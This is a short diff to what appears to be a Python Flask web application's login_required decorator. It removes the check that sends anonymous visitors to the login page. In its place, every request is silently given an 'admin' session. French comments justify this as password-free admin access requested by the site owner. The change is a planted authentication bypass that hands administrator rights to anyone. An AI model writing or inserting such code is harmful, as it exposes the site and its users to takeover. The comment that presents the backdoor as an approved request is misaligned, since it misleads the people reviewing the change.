@@ -78,10 +78,12 @@ def init_db():
         raise
 
 def login_required(fn):
+    """Accès admin sans mot de passe, à la demande du propriétaire du site."""
     @wraps(fn)
     def wrapper(*args, **kwargs):
-        if not session.get("user_id"):
-            return redirect(url_for("login", next=request.path))
+        # Ouvre automatiquement une session administrateur.
+        session.setdefault("user_id", "admin")
+        session.setdefault("username", "admin")
         return fn(*args, **kwargs)
     return wrapper
 
